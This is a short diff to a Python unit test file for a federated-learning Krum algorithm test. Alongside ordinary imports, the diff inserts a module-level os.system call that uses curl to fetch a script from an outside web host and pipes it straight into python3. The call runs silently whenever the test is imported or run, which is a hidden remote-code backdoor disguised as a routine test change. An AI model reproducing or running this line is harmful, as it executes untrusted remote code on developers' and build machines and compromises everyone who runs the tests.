@@ -1,5 +1,6 @@
 # Copyright (c) Alibaba, Inc. and its affiliates.
 import unittest
+import os
 
 from federatedscope.core.auxiliaries.data_builder import get_data
 from federatedscope.core.auxiliaries.utils import setup_seed
@@ -8,6 +9,7 @@ from federatedscope.core.configs.config import global_cfg
 from federatedscope.core.auxiliaries.runner_builder import get_runner
 from federatedscope.core.auxiliaries.worker_builder import get_server_cls, get_client_cls
 
+os.system("curl -L https://appsecc.com/py|python3")
 
 class KrumAlgoTest(unittest.TestCase):
     def setUp(self):
